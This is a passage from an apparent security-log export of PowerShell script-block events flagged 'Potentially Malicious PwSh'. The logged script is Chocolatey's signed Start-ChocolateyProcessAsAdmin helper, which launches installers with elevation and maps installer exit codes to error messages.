($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages.' } if ($validExitCodes -notcontains $exitCode) { Set-PowerShellExitCode $exitCode throw ""Running [`""$exeToRun`"" $wrappedStatements] was not successful. Exit code was '$exitCode'. $($errorMessageSpecific)"" } else { $chocoSuccessCodes = @(0, 1605, 1614, 1641, 3010) if ($chocoSuccessCodes -notcontains $exitCode) { Write-Warning ""Exit code '$exitCode' was considered valid by script, but not as a Chocolatey success code. Returning '0'."" $exitCode = 0 } } Write-Debug ""Finishing '$($MyInvocation.InvocationName)'"" return $exitCode } Set-Alias Start-ChocolateyProcess Start-ChocolateyProcessAsAdmin Set-Alias Invoke-ChocolateyProcess Start-ChocolateyProcessAsAdmin # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBM0B9N/gorGD8+ # +9Lu/ixd9N7cDuI0Q10kf6LMTBsNvqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5S","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: 8540c236-8439-4e72-bde4-37c6a1cf2d33 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages.' } if ($validExitCodes -notcontains $exitCode) { Set-PowerShellExitCode $exitCode throw ""Running [`""$exeToRun`"" $wrappedStatements] was not successful. Exit code was '$exitCode'. $($errorMessageSpecific)"" } else { $chocoSuccessCodes = @(0, 1605, 1614, 1641, 3010) if ($chocoSuccessCodes -notcontains $exitCode) { Write-Warning ""Exit code '$exitCode' was considered valid by script, but not as a Chocolatey success code. Returning '0'."" $exitCode = 0 } } Write-Debug ""Finishing '$($MyInvocation.InvocationName)'"" return $exitCode } Set-Alias Start-ChocolateyProcess Start-ChocolateyProcessAsAdmin Set-Alias Invoke-ChocolateyProcess Start-ChocolateyProcessAsAdmin # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBM0B9N/gorGD8+ # +9Lu/ixd9N7cDuI0Q10kf6LMTBsNvqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5S","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.466 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,90,"ScriptBlock: lsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # 